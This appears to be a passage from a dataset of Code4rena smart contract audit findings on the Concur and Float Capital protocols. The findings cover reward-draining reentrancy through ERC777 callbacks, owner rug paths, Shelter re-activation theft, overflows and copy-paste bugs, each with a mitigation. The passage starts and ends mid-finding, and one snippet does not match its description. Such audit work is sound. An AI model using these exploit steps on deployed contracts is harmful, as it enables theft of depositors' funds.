*   The contract has `500000e18` `usdm` tokens and `250000e18` `pool3` tokens.
*   `addingLiquidity` will be calculated as `500000e18 / 250000e18 * 250000e18`.
*   The function will attempt to add `500000e18` `usdm` and `pool3` tokens in which there are insufficient `pool3` tokens in the contract. As a result, it will revert even though there is an abundance of tokens that satisfy the `step` amount.

### Proof of Concept

[USDMPegRecovery.sol#L73-L82](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/USDMPegRecovery.sol#L73-L82)<br>

    function provide(uint256 _minimumLP) external onlyGuardian {
        require(usdm.balanceOf(address(this)) >= totalLiquidity.usdm, ""<liquidity"");
        // truncate amounts under step
        uint256 addingLiquidity = (usdm.balanceOf(address(this)) / step) * step;
        // match usdm : pool3 = 1 : 1
        uint256[2] memory amounts = [addingLiquidity, addingLiquidity];
        usdm.approve(address(usdm3crv), addingLiquidity);
        pool3.approve(address(usdm3crv), addingLiquidity);
        usdm3crv.add_liquidity(amounts, _minimumLP);
    }

### Tools Used

Manual code review.<br>
Discussions with Taek.

### Recommended Mitigation Steps

Consider modifying the `provide` function such that a `_steps` argument can be supplied. This will allow guardians to maximise the amount of liquidity provided to the Curve pool.







***"
83.md,`StakingRewards.recoverERC20` allows owner to rug the `rewardsToken`,medium,"[StakingRewards.sol#L166](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/StakingRewards.sol#L166)<br>

`StakingRewards.recoverERC20` rightfully checks against the `stakingToken` being sweeped away.<br>
However, there's no check against the `rewardsToken` which over time will sit in this contract.

This is the case of an admin privilege, which allows the owner to sweep the rewards tokens, perhaps as a way to rug depositors.

### Proof of Concept

Calling `StakingRewards.recoverERC20(rewardsToken, rewardsToken.balanceOf(this))` enables the `owner` to sweep the token.

### Recommended Mitigation Steps

Add an additional check

            require(
                tokenAddress != address(rewardsToken),
                ""Cannot withdraw the rewards token""
            );






***"
83.md,Owner can steal Concur rewards,medium,"[MasterChef.sol#L78-L80](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L78-L80)<br>
[MasterChef.sol#L157-L180](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L157-L180)<br>

Owner can steal Concur rewards by adding a depositor and inflating other depositors' assigned balance of the token within the contract. Thus, the owner-managed depositor can get most (all but one wei) of the created tokens.

### Recommended Mitigation Steps

Do not allow the owner to add depositors after the depositors have been configured.





***"
83.md,Owner can lock tokens in `MasterChef`,medium,"[MasterChef.sol#L82-L84](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L82-L84)<br>

Owner can remove a depositor. Since only depositors can deposit and withdraw, the owner may add a contract to the whitelist, let users deposit in the contract and remove the depositor from the whitelist. Depositor's reward cannot be withdrawn then. And takes a share of Concur tokens that will not be distributed.

### Recommended Mitigation Steps

Remove `onlyDepositor` modifier from the `withdraw` function.






***"
83.md,Rewards get diluted because `totalAllocPoint` can only increase.,medium,"[MasterChef.sol](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol)<br>

There is no functionality for removing pools/setting pool's allocPoints. Therefore `totalAllocPoint` only increases and rewards for pool decreases.

### Proof of Concept

Scenario:

1.  Owner adds new pool (first pool) for staking with points = 900 (totalAllocPoint=900).
2.  1 week passes.
3.  First pool staking period ends (or for other reasons that pool is not meaningfully anymore).
4.  Owner adds new pool (second pool) for staking with points = 100 (totalAllocPoint=1000).
5.  1 block later Alice stake 10 tokens there (at the same time).
6.  1 week passes.
7.  After some time Alice claims rewards. But she is eligible only for 10% of the rewards. 90% goes to unused pool.

### Recommended Mitigation Steps

Add functionality for removing pool or functionality for setting pool's `totalAllocPoint` param.






***"
83.md,Deactivate function can be bypassed,medium,"onlyClient can deactivate a token even after deadline is passed and transfer all token balance to itself.

### Proof of Concept

1.  Navigate to contract [Shelter.sol](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol)

2.  Observe that token can only be deactivated if activated\[\_token] + GRACE_PERIOD > block.timestamp. We will bypass this

3.  onlyClient activates a token X using the activate function

4.  Assume Grace period is crossed such that activated\[\_token] + GRACE_PERIOD < block.timestamp

5.  Now if onlyClient calls deactivate function, it fails with ""too late""

6.  But onlyClient can bypass this by calling activate function again on token X which will reset the timestamp to latest in activated\[\_token] and hence onlyClient can now call deactivate function to disable the token and retrieve all funds present in the contract to his own address

### Recommended Mitigation Steps

Add below condition to activate function:

    function activate(IERC20 _token) external override onlyClient {
    require(activated[_token]==0, ""Already activated"");
            activated[_token] = block.timestamp;
            savedTokens[_token] = _token.balanceOf(address(this));
            emit ShelterActivated(_token);
        }






***"
83.md,Users Will Lose Concur Rewards If The Shelter Mechanism Is Enacted On A Pool,medium,"The shelter mechanism aims to protect the protocol's users by draining funds into a separate contract in the event of an emergency. However, while users are able to reclaim their funds through the `Shelter.sol` contract, they will still have a deposited balance from the perspective of `ConvexStakingWrapper.sol`.

However, if the shelter mechanism is enacted before users are able to claim their Concur rewards, any accrued tokens will be lost and the `MasterChef.sol` contract will continue to allocate tokens to the sheltered pool which will be forever locked within this contract.

There is currently no way to remove sheltered pools from the `MasterChef.sol` contract, hence any balance lost in the contract cannot be recovered due to a lack of a sweep mechanism which can be called by the contract owner.

### Proof of Concept

[ConvexStakingWrapper.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol)<br>

[MasterChef.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/MasterChef.sol)<br>

### Recommended Mitigation Steps

Consider removing sheltered pools from the `MasterChef.sol` Concur token distribution. It is important to ensure `massUpdatePools` is called before making any changes to the list of pools. Additionally, removing pools from this list may also create issues with how `_pid` is produced on each new pool. Therefore, it may be worthwhile to rethink this mechanism such that `_pid` tracks some counter variable and not `poolInfo.length - 1`.






***"
83.md,Rogue pool in Shelter,medium,"[Shelter.sol#L38-L42](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/Shelter.sol#L38-L42)<br>

Shelter contract can steal user tokens.

### Proof of Concept

Shelter `client` can call `activate` on an already activated token, this will reset its start time, so if the client activate a token when it `GRACE_PERIOD` is almost finished, it will reset this time.<br>
This will prevent the user to call `withdraw` because the condition `activated[_token] + GRACE_PERIOD < block.timestamp` but will allow the client to call `deactivate` and receive all funds from the users because it will satisfy the condition `activated[_token] + GRACE_PERIOD > block.timestamp`.

Steps:

*   client `activate` tokenA.
*   Users deposit tokenA using `donate`.
*   client `activate` tokenA again until they has enough tokens.
*   More users use `donate`.
*   client deactivate tokenA and receive all tokens.

### Recommended Mitigation Steps

*   Avoid `activate` twice for the same token
*   `donate` only after the `GRACE_PERIOD`






***"
83.md,`MasterChef.updatePool()` Fails To Update Reward Variables If `block.number >= endBlock`,medium,"The `updatePool` function intends to calculate the accumulated Concur rewards by tracking the number of blocks passed since the last update to correctly determine how many Concur tokens to distribute to each share. The reward distribution has a start and end block which dictates the timeframe by which rewards will be distributed to the underlying pool.

If a pool has not recently updated itself and has reached the  `block.number >= endBlock` statement in `updatePool`, then any rewards that it would normally be entitled to prior to reaching `endBlock` will not be attributed to the pool. Therefore, once rewards are no longer being distributed, pools who had not recently called `updatePool` before reaching `endBlock` are at a disadvantage as compared to more active pools.

#### Proof of Concept

[MasterChef.sol#L135-L154](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L135-L154)

    // Update reward variables of the given pool to be up-to-date.
    function updatePool(uint _pid) public {
        PoolInfo storage pool = poolInfo[_pid];
        if (block.number <= pool.lastRewardBlock) {
            return;
        }
        uint lpSupply = pool.depositToken.balanceOf(address(this));
        if (lpSupply == 0 || pool.allocPoint == 0) {
            pool.lastRewardBlock = block.number;
            return;
        }
        if(block.number >= endBlock) {
            pool.lastRewardBlock = block.number;
            return;
        }        

        uint multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        pool.accConcurPerShare = pool.accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));
        pool.lastRewardBlock = block.number;
    }

### Recommended Mitigation Steps

Ensure that once the `block.number >= endBlock` statement has been reached, the `pool.accConcurPerShare` is updated to reflect the number of blocks that have passed up until `endBlock`. The number of blocks should be equal to `endBlock - pool.lastRewardBlock`. This will ensure stale pools are not negatively impacted once `endBlock` has been reached by the contract.






***"
83.md,[ConcurRewardPool] Possible reentrancy when claiming rewards,medium,"[ConcurRewardPool.sol#L34](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConcurRewardPool.sol#L34)<br>

Since the reward tokens are transferred before the balances are set to 0, it is possible to perform a reentrancy attack if the reward token has some kind of call back functionality e.g. ERC777. pBTC is an ERC777 token that is currently available on Convex. A similar attack occurred with [imBTC on uniswap v1](https://zengo.com/imbtc-defi-hack-explained/).

### Proof of Concept

*   Preparation
    1.  Assume that pBTC is used as extra rewards for this victim convex pool.
    2.  A malicious user interacts with Concur through a smart contract. He follows the standard flow and has some rewards to be claimed.
    3.  The malicious user interacts with this smart contract to register a bad `tokensToSend()` callback function through the ERC-1820 contract.
    4.  In this `tokensToSend()` function, he calls `ConcurRewardPool.claimRewards()` n-1 more times to drain contract.
*   Attack
    1.  When he calls `ConcurRewardPool.claimRewards()` for the first time, the pBTC reward tokens are transferred.
    2.  You can see from the [pBTC contract](https://etherscan.io/address/0x5228a22e72ccc52d415ecfd199f99d0665e7733b#code) on line 871 that `_callTokensToSend(from, from, recipient, amount, """", """");` is called inside the `transfer()` function.
    3.  If you trace to the `_callTokensToSend` function definition to line 1147, you will notice that it calls `IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);` on line 1159.
    4.  Since the malicious user already registered a bad `tokensToSend()` function, this function will be called thus draining majority of the pBTC rewards available on the `ConcurRewardPool` contract.

You can also find a walkthrough replicating a similar attack [here](https://medium.com/amber-group/preventing-re-entrancy-attacks-lessons-from-history-c2d96480fac3).

### Recommended Mitigation Steps

*   Use a nonReentrant modifier
*   set balances to 0 first before disbursing the rewards






***"
83.md,If The Staking Token Exists In Both `StakingRewards.sol` And `ConvexStakingWrapper.sol` Then It Will Be Possible To Continue Claiming Concur Rewards After The Shelter Has Been Activated,medium,"Staking tokens are used to deposit into the `StakingRewards.sol` and `ConvexStakingWrapper.sol` contracts. Once deposited, the user is entitled to Concur rewards in proportion to their staked balance and the underlying pool's `allocPoint` in the `MasterChef.sol` contract.

The `Shelter.sol` mechanism allows the owner of the `ConvexStakingWrapper.sol` to react to emergency events and protect depositor's assets. The staking tokens can be withdrawn after the grace period has passed. However, these staking tokens can be deposited into the `StakingRewards.sol` contract to continue receiving Concur rewards not only for `StakingRewards.sol` but also for their `ConvexStakingWrapper.sol` deposited balance which has not been wiped. As a result, users are able to effectively claim double the amount of Concur rewards they should be receiving.

#### Proof of Concept

[MasterChef.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/MasterChef.sol)<br>

[StakingRewards.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/StakingRewards.sol)<br>

[ConvexStakingWrapper.sol](https://github.com/code-423n4/2022-02-concur/blob/shelter-client/contracts/ConvexStakingWrapper.sol)<br>

### Recommended Mitigation Steps

Ensure that staking tokens cannot be deposited in both the `StakingRewards.sol` and `ConvexStakingWrapper.sol` contracts. If this is intended behaviour, it may be worthwhile to ensure that the sheltered users have their deposited balance wiped from the `MasterChef.sol` contract upon being sheltered.






***"
83.md,Transfer to treasury can register as succeeded when failing in `_calcRewardIntegral`,medium,"[StakingRewards.sol#L126](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L126)<br>

If the transfer of the reward token fails to the treasury (due to insufficient funds for example), the function `_calcRewardIntegral` will still update accounting and cause devastating accounting discrepancies in the contract.

### Proof of Concept

Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

### Recommended Mitigation Steps

`require(IERC20(reward.token).transfer(treasury, d_reward / 5), ""ERROR_MESSAGE"");`






***"
83.md,Rewards distribution can be disrupted by a early user,medium,"[ConvexStakingWrapper.sol#L184-L188](https://github.com/code-423n4/2022-02-concur/blob/02d286253cd5570d4e595527618366f77627cdaf/contracts/ConvexStakingWrapper.sol#L184-L188)<br>

```solidity
if (_supply > 0 && d_reward > 0) {
    reward.integral =
        reward.integral +
        uint128((d_reward * 1e20) / _supply);
}
```

`reward.integral` is `uint128`, if an early user deposits with just `1` Wei of `lpToken`, and make `_supply == 1`, and then transferring `5e18` of `reward_token` to the contract.

As a result, `reward.integral` can exceed `type(uint128).max` and overflow, causing the rewards distribution to be disrupted.

### Recommended Mitigation Steps

Consider `wrap` a certain amount of initial totalSupply at deployment, e.g. `1e8`, and never burn it. And consider using uint256 instead of uint128 for `reward.integral`. Also, consider lower `1e20` down to `1e12`.






***"
83.md,`ConvexStakingWrapper#deposit()` depositors may lose their funds when the `_amount` is huge,medium,"When the value of `_amount` is larger than `type(uint192).max`, due to unsafe type casting, the recorded deposited amount can be much smaller than their invested amount.

[ConvexStakingWrapper.sol#L228-L250](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/ConvexStakingWrapper.sol#L228-L250)<br>

```solidity
function deposit(uint256 _pid, uint256 _amount)
    external
    whenNotPaused
    nonReentrant
{
    _checkpoint(_pid, msg.sender);
    deposits[_pid][msg.sender].epoch = currentEpoch();
    deposits[_pid][msg.sender].amount += uint192(_amount);
    if (_amount > 0) {
        IERC20 lpToken = IERC20(
            IRewardStaking(convexPool[_pid]).poolInfo(_pid).lptoken
        );

        lpToken.safeTransferFrom(msg.sender, address(this), _amount);
        lpToken.safeApprove(convexBooster, _amount);
        IConvexDeposits(convexBooster).deposit(_pid, _amount, true);
        lpToken.safeApprove(convexBooster, 0);
        uint256 pid = masterChef.pid(address(lpToken));
        masterChef.deposit(msg.sender, pid, _amount);
    }

    emit Deposited(msg.sender, _amount);
}
```

### Proof of Concept

When `_amount` = `uint256(type(uint192).max) + 1`:

*   At L235, `uint192(_amount)` = `0`, `deposits[_pid][msg.sender].amount` = `0`;
*   At L241, `uint256(type(uint192).max) + 1` will be transferFrom `msg.sender`.

Expected results:

`deposits[_pid][msg.sender].amount` == `uint256(type(uint192).max) + 1`;

Actual results:

`deposits[_pid][msg.sender].amount` = `0`.

The depositor loses all their invested funds.

### Recommended Mitigation Steps

Consider adding a upper limit for the `_amount` parameter:

```solidity
require(_amount <= type(uint192).max, ""..."");
```






***"
83.md,"`StakingRewards.setRewardsDuration` allows setting near zero or enormous `rewardsDuration`, which breaks reward logic",medium,"notifyRewardAmount will be inoperable if rewardsDuration is set to zero. If will cease to produce meaningful results if rewardsDuration is too small or too big.

### Proof of Concept

The setter does not control the value, allowing zero/near zero/enormous duration:

[StakingRewards.sol#L178-185](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/StakingRewards.sol#L178-185)

Division by the duration is used in notifyRewardAmount:

[StakingRewards.sol#L143-156](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/StakingRewards.sol#L143-156)

### Recommended Mitigation Steps

Check for min and max range in the rewardsDuration setter, as too small or too big rewardsDuration breaks the logic.






***"
83.md,`MasterChef.sol` A `depositor` can deposit an arbitrary amount without no cost,medium,"The owner of `MasterChef.sol` can add a `depositor` with `addDepositor()`.

[MasterChef.sol#L78-L80](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L78-L80)<br>

```solidity
function addDepositor(address _depositor) external onlyOwner {
    isDepositor[_depositor] = true;
}
```

A `depositor` can deposit with an arbitrary amount, without any cost.

[MasterChef.sol#L157-L180](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L157-L180)<br>

```solidity
function deposit(address _recipient, uint _pid, uint _amount) external nonReentrant onlyDepositor {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][_msgSender()];
    updatePool(_pid);
    
    if(user.amount > 0) {  
        uint pending = user.amount * pool.accConcurPerShare / _concurShareMultiplier - user.rewardDebt;
        if (pending > 0) {
            safeConcurTransfer(_recipient, pending);
        }
    }

    if (_amount > 0) {
        if (pool.depositFeeBP > 0) {
            uint depositFee = _amount.mul(pool.depositFeeBP).div(_perMille);
            user.amount = SafeCast.toUint128(user.amount + _amount - depositFee);
        } else {
            user.amount = SafeCast.toUint128(user.amount + _amount);
        }
    }     

    user.rewardDebt = SafeCast.toUint128(user.amount * pool.accConcurPerShare / _concurShareMultiplier);
    emit Deposit(_recipient, _pid, _amount);
}
```

This allows a malicious/compromised depositor to take the majority share (nearly 100%) of all pools simply by calling `deposit()` with extremely large amounts, and take all the rewards.

### Recommended Mitigation Steps

See the `Recommendation` section on [issue #200](https://github.com/code-423n4/2022-02-concur-findings/issues/200) and remove the `depositor` role.





***"
83.md,"During stake or deposit, users would not be rewarded the correct Concur token, when MasterChef has under-supply of it",medium,"During stake or deposit, users would not be transferred the correct Concur token, when MasterChef has under-supply of it.

There is an assumption that MasterChef contract would own enough Concur tokens so as to distribute to users as reward, during deposit or withdraw. But say, due to excess user activity, MasterChef runs out of Concur tokens. All deposits & withdraws that happen after that, would have zero transfer of Concur token to the user. This will continue until the MasterChef contract is replenished again.

### Proof of Concept

[MasterChef.sol#L205-L206](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L205-L206)<br>

Makeshift unit test
Note: Temporarily modify the private function MasterChef.safeConcurTransfer to public function, for unit test validation

```bash
//Unit Test starts
  it(""MasterChef - Zero Concur balance"", async function() {
    await concurToken.mint(masterChef.address, 100);
    console.log(await concurToken.balanceOf(masterChef.address), await concurToken.balanceOf(user1.address));
    await masterChef.safeConcurTransfer(user1.address, 60); // user1 is rewarded correctly.
    console.log(await concurToken.balanceOf(masterChef.address), await concurToken.balanceOf(user1.address));
    await masterChef.safeConcurTransfer(user1.address, 60); // user1 is rewarded lesser by 10.
    console.log(await concurToken.balanceOf(masterChef.address), await concurToken.balanceOf(user1.address));
    await masterChef.safeConcurTransfer(user1.address, 60); // user1 is totally not rewarded.
    console.log(await concurToken.balanceOf(masterChef.address), await concurToken.balanceOf(user1.address));
  });
//Unit Test ends
```

### Tools Used

Manual review, & makeshift Unit test

### Recommended Mitigation Steps

Minimal recommended fix:

To `MasterChef.safeConcurTransfer` function, add the following require statement. This will at least ensure that, when there is zero balance in MasterChef contract, the safeConcurTransfer function will not succeed.

```bash
    function safeConcurTransfer(address _to, uint _amount) private {
        uint concurBalance = concur.balanceOf(address(this));
        require(concurBalance>0, ""safeConcurTransfer: balance is zero."");
```







***"
83.md,`ConvexStakingWrapper` deposits and withdraws will frequently be disabled if a token that doesn't allow zero value transfers will be added as a reward one,medium,"If deposits and withdraws are done frequently enough, the reward update operation they invoke will deal mostly with the case when there is nothing to add yet, i.e. `reward.remaining` match the reward token balance.

If reward token doesn't allow for zero value transfers, the reward update function will fail on an empty incremental reward transfer, which is now done unconditionally, reverting the caller deposit/withdrawal functionality

### Proof of Concept

When ConvexStakingWrapper isn't paused, every deposit and withdraw update current rewards via `_checkpoint` function before proceeding:

[ConvexStakingWrapper.sol#L233](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L233)<br>

[ConvexStakingWrapper.sol#L260](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L260)<br>

`_checkpoint` calls `_calcRewardIntegral` for each of the reward tokens of the pid:

[ConvexStakingWrapper.sol#L220](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L220)<br>

`_calcRewardIntegral` updates the incremental reward for the token, running the logic even if reward is zero, which is frequently the case:

[ConvexStakingWrapper.sol#L182](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L182)<br>

If the reward token doesn't allow zero value transfers, this transfer will fail, reverting the corresponding deposit or withdraw.

### Recommended Mitigation Steps

Consider checking the reward before doing transfer (and the related computations as an efficiency measure):

Now:

    IERC20(reward.token).transfer(address(claimContract), d_reward);

To be:

    if (d_reward > 0)
    	IERC20(reward.token).transfer(address(claimContract), d_reward);






***"
83.md,`StakingRewards` reward rate can be dragged out and diluted,medium,"[StakingRewards.sol#L161](https://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L161)<br>

The `StakingRewards.notifyRewardAmount` function receives a `reward` amount and extends the current reward end time to `now + rewardsDuration`.<br>
It rebases the currently remaining rewards + the new rewards (`reward + leftover`) over this new `rewardsDuration` period.

```solidity
function withdraw(IERC20 _token, address _to) external override {
    require(activated[_token] != 0 && activated[_token] + GRACE_PERIOD < block.timestamp, ""shelter not activated"");
    // @audit uses `msg.sender`'s share but sets `claimed` for _to! can claim for many `_to`s
    uint256 amount = savedTokens[_token] * client.shareOf(_token, msg.sender) / client.totalShare(_token);
    claimed[_token][_to] = true;
    emit ExitShelter(_token, msg.sender, _to, amount);
    _token.safeTransfer(_to, amount);
}
```

This can lead to a dilution of the reward rate and rewards being dragged out forever by malicious new reward deposits.

### Proof of Concept

Imagine the current rewardRate is `1000 rewards / rewardsDuration`.<br>
20% of the `rewardsDuration` passed, i.e., `now = lastUpdateTime + 20% * rewardsDuration`.<br>
A malicious actor notifies the contract with a reward of `0`: `notifyRewardAmount(0)`.<br>
Then the new `rewardRate = (reward + leftover) / rewardsDuration = (0 + 800) / rewardsDuration = 800 / rewardsDuration`.<br>
The `rewardRate` just dropped by 20%.<br>
This can be repeated infinitely.<br>
After another 20% of reward time passed, they trigger `notifyRewardAmount(0)` to reduce it by another 20% again:<br>
`rewardRate = (0 + 640) / rewardsDuration = 640 / rewardsDuration`.

### Recommended Mitigation Steps

Imo, the `rewardRate` should never decrease by a `notifyRewardAmount` call.<br>
Consider not extending the reward payouts by `rewardsDuration` on every call.<br>
`periodFinish` probably shouldn't change at all, the `rewardRate` should just increase by `rewardRate += reward / (periodFinish - block.timestamp)`.

Alternatively, consider keeping the `rewardRate` constant but extend `periodFinish` time by `+= reward / rewardRate`.





***"
83.md,execute in VoteProxy should be payable,medium,"`execute` will revert when `msg.value > 0`

### Proof of Concept

Lacking `payable` mutability specifier.

[VoteProxy.sol#L28-L35](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/VoteProxy.sol#L28-L35)<br>

```solidity
    function execute(
        address _to,
        uint256 _value,
        bytes calldata _data
    ) external onlyOwner returns (bool, bytes memory) {
        (bool success, bytes memory result) = _to.call{value: _value}(_data);
        return (success, result);
    }
```

### Recommended Mitigation Steps

Add `payable` mutability specifier.







***"
22.md,copy paste error in `_batchConfirmOutstandingPendingActions`,high,"The function `_batchConfirmOutstandingPendingActions` of `LongShort.sol` processes the variable `batched_amountSyntheticToken_toShiftAwayFrom_marketSide`, and sets it to 0 after processing. However, probably due to a copy/paste error, in the second instance, where `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false]` is processed, the wrong version is set to 0: `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true]` = 0

This means the next time the `batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false]` is processed again. As it is never reset, it keeps increasing. The result is that the internal administration will be off and far too many tokens will be shifted tokens from SHORT to LONG.

[`LongShort.sol` L1126](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1126)
```solidity
function _batchConfirmOutstandingPendingActions(
..
    amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true];
    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0;
...
    amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false];
    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0; // should probably be false
)
```

Recommend changing the second instance of the following (on line 1207)
`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0`
to
`batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] = 0`

p.s. confirmed by Jason of Floatcapital: ""Yes, that should definitely be false!"""
22.md,2 variables not indexed by `marketIndex`,high,"In the token contract: `batched_stakerNextTokenShiftIndex` is indexed by `marketIndex`, so it can have separate (or the same) values for each different `marketIndex`.

`stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping` are not indexed by `marketIndex`.
So the values of `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping` and `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping`
can be overwritten by a different market, if `batched_stakerNextTokenShiftIndex[market1]`==`batched_stakerNextTokenShiftIndex[market2]`

This will lead to weird results in` _calculateAccumulatedFloat`, allocating too much or too little float.

[`Staker.sol` L622](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L622)
```solidity
function pushUpdatedMarketPricesToUpdateFloatIssuanceCalculations(
    ...
      stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping[ batched_stakerNextTokenShiftIndex[marketIndex]  ] = stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingIfShiftExecuted;
      stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping[  batched_stakerNextTokenShiftIndex[marketIndex]  ] = latestRewardIndex[marketIndex] + 1;
      batched_stakerNextTokenShiftIndex[marketIndex] += 1;
...
)
```

Recommend adding an index with `marketIndex` to the variables:
- `stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping`
- `stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping`

Also consider shortening the variable names, this way mistakes can be spotted easier.

Confirmed by Jason of Float Capital: Yes, you are totally right, it should use the `marketIndex` since they are specific per market!"
22.md,Users could shift tokens on `Staker` with more than he has staked,high,"The `shiftTokens` function of `Staker` checks whether the user has staked at least the number of tokens he wants to shift from one side to the other (line 885). A user could call the `shiftTokens` function multiple times before the next price update to shift the staker's token from one side to the other with more than he has staked. [Staker.sol#L885](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L885)

Recommend adding checks on `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long` and `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short` to ensure that the sum of the two variables does not exceed user's stake balance."
22.md,`latestMarket` used where `marketIndex` should have been used,medium,"The functions `initializeMarket` and `_seedMarketInitially` use the variable `latestMarket`.
If these functions would be called seperately from `createNewSyntheticMarket`, then `latestMarket` would have the same value for each call of `initializeMarket` and `_seedMarketInitially`

This would mean that the `latestMarket` is initialized multiple times and the previous market(s) are not initialized properly.
Note: the call to addNewStakingFund could have prevented this issue, but also allows this, see separate issue.

Note: the functions can only be called by the admin, so if `createNewSyntheticMarket` and `initializeMarket` are called in combination, then it would not lead to problems,
but in future release of the software the calls to `createNewSyntheticMarket` and `initializeMarket` might get separated.

[`LongShort.sol` #L304](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L304)
```solidity
function _seedMarketInitially(uint256 initialMarketSeedForEachMarketSide, uint32 marketIndex) internal virtual {
  ...
  ISyntheticToken(syntheticTokens[latestMarket][true]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);   // should be marketIndex
  ISyntheticToken(syntheticTokens[latestMarket][false]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);  // should be marketIndex

function initializeMarket(
    uint32 marketIndex,....)
...
  require(!marketExists[marketIndex], ""already initialized"");
  require(marketIndex <= latestMarket, ""index too high"");
  marketExists[marketIndex] = true;
..
  IStaker(staker).addNewStakingFund(
    `latestMarket`,                                       // should be marketIndex.
    syntheticTokens[latestMarket][true],   // should be marketIndex
    syntheticTokens[latestMarket][false],  // should be marketIndex
...
```

Recommend replacing `latestMarket` with `marketIndex` in the functions `initializeMarket` and `_seedMarketInitially`.

p.s. confirmed by Jason of float capital: Definitely an issue, luckily both of those functions are adminOnly. But that is definitely not ideal!"
22.md,Incorrect balance computed in `getUsersConfirmedButNotSettledSynthBalance()`,medium,"Consider the following state:
```solidity
long_synth_balace = 300;
short_synth_balace = 200;

marketUpdateIndex[1] = x;
userNextPrice_currentUpdateIndex = 0;
userNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 0;
batched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 0;
```

User calls `shiftPositionFromLongNextPrice(marketIndex=1, amountSyntheticTokensToShift=100)`

This results in following state changes:
```solidity
long_synth_balace = 200;
short_synth_balace = 200;
userNextPrice_syntheticToken_toShiftAwayFrom_marketSide[1][true] = 100;
batched_amountSyntheticToken_toShiftAwayFrom_marketSide[1][true] = 100;
userNextPrice_currentUpdateIndex = x+1 ;
```

Due to some other transactions, oracle updates twice, and now the `marketUpdateIndex[1]` is x+2 and also updating price snapshots.

When User calls `getUsersConfirmedButNotSettledSynthBalance(user, 1)`

initial condition:
```solidity
if (
  userNextPrice_currentUpdateIndex[marketIndex][user] != 0 &&
  userNextPrice_currentUpdateIndex[marketIndex][user] <= currentMarketUpdateIndex
)
```
will be true;
